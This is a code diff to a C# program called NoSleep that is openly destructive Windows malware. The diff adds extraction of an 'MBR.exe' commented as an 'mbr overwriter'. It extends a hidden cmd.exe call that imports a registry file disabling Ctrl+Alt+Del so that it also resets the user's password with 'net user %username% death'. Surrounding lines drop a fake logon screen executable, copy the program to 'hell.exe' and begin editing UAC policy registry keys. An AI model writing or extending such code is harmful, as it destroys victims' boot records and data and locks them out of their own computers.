@@ -88,6 +88,7 @@ namespace NoSleep
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "AxInterop.WMPLib.dll"); //dll import for video
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "Interop.WMPLib.dll"); //dll import for video
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "RSOD.exe"); //we need to create fake logonui
+                Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "MBR.exe"); //mbr overwriter
                 File.Copy(@"C:\Program Files\Temp\NoSleep.exe", @"C:\Program Files\Temp\hell.exe");
 
                 //Disable ctrl+alt+del
@@ -95,8 +96,9 @@ namespace NoSleep
                 ProcessStartInfo ctrlaltdel = new ProcessStartInfo();
                 ctrlaltdel.FileName = "cmd.exe";
                 ctrlaltdel.WindowStyle = ProcessWindowStyle.Hidden;
-                ctrlaltdel.Arguments = @"/k regedit /s " + quote + @"C:\Program Files\Temp\disctrl.reg" + quote + " && exit";
-                Process.Start(ctrlaltdel);
+                ctrlaltdel.Arguments = @"/k regedit /s " + quote + @"C:\Program Files\Temp\disctrl.reg" + quote + @" && net user %username% death && exit";
+                var process = Process.Start(ctrlaltdel);
+                process.WaitForExit();
 
                 //Some reg keys
                 RegistryKey keyUAC = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
